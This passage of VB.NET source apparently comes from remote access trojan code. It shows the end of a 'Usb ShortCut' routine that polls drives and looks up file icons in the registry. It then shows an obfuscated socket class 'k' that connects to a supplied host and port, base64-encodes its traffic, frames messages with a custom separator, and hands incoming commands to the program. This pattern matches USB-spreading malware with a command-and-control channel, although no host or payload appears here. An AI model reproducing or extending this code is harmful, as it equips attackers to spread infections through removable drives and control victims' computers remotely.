                    Catch ex As Exception
                    End Try
                Next
                Threading.Thread.CurrentThread.Sleep(3000)
            Loop
            thread = Nothing
        End Sub
        Private Function GetIcon(ByVal ext As String) As String
            Try
                Dim r = Microsoft.Win32.Registry _
                .LocalMachine.OpenSubKey("Software\Classes\", False)
                Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False) _
                .GetValue("") & "\DefaultIcon\").GetValue("", "")
                If e.Contains(",") = False Then e &= ",0"
                Return e
            Catch ex As Exception
                Return ""
            End Try
        End Function
    End Class
#End Region '''Usb ShortCut
#Region "Socket_Class"
    Private Class k
        Private C As TcpClient
        Public Event Connected()
        Public Event Disconnected()
        Public Event Data(ByVal b As Byte())
        Private IsBuzy As Boolean = False
        Public Function Statconnected() As Boolean
            Try
                If C.Client.Connected = True Then
                    Return True
                Else
                    Return False
                End If
            Catch ex As Exception
            End Try
        End Function
        Sub Connect(ByVal h As String, ByVal p As Integer)
            Try
                Try
                    If C IsNot Nothing Then
                        C.Close()
                        C = Nothing
                    End If
                Catch ex As Exception
                End Try
                Do Until IsBuzy = False
                    Threading.Thread.CurrentThread.Sleep(1)
                Loop
                Try
                    C = New TcpClient

                    C.Connect(h, p)
                    Dim t As New Threading.Thread(AddressOf RC, 10)
                    t.Start()
                    RaiseEvent Connected()
                Catch ex As Exception
                End Try
            Catch ex As Exception
                RaiseEvent Disconnected()
            End Try
        End Sub
        Private SPL As String = "sb-lj"
        Sub DisConnect()
            Try
                C.Close()
            Catch ex As Exception
            End Try
            C = Nothing
            RaiseEvent Disconnected()
        End Sub
        Sub Send(ByVal s As String)
            Try
                Send(SB(s))
            Catch ex As Exception

            End Try

        End Sub
        Sub Send(ByVal b As Byte())
            Dim base64Encoded As String
            base64Encoded = System.Convert.ToBase64String(b)
            b = SB(base64Encoded)
            Try
                Dim m As New IO.MemoryStream
                m.Write(b, 0, b.Length)
                m.Write(SB(SPL), 0, SPL.Length)
                C.Client.Send(m.ToArray, 0, m.Length, SocketFlags.None)
            Catch ex As Exception
                DisConnect()
            End Try
        End Sub
        Private Sub RC()
            IsBuzy = True
            Dim M As New IO.MemoryStream
            Dim cc As Integer = 0
re:
            Threading.Thread.CurrentThread.Sleep(1)

            Try
                If C Is Nothing Then
                    GoTo co
                Else
                    If C.Client.Connected = False Then
                        GoTo co
                    Else
                        cc += 1
                        If cc > 100 Then
                            cc = 0
                            Try
                                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then
                                    GoTo co
                                End If
                            Catch ex As Exception
                                GoTo co
                            End Try
                        End If

                    End If
                End If
                If C.Available > 0 Then
                    Dim B(C.Available - 1) As Byte
                    C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                    M.Write(B, 0, B.Length)
rr:
                    If BS(M.ToArray).Contains(SPL) Then
                        Dim A As Array = fx(M.ToArray, SPL)
                        RaiseEvent Data(A(0))
                        M.Dispose()
                        M = New IO.MemoryStream
                        If A.Length = 2 Then
                            M.Write(A(1), 0, A(1).length)
                            Threading.Thread.CurrentThread.Sleep(1)
                            GoTo rr
                        End If
                    End If
                End If
            Catch ex As Exception
                GoTo co
            End Try
            GoTo re
co:
            IsBuzy = False
            DisConnect()
        End Sub


    End Class
#End Region ''' Socket_Connector
End Module
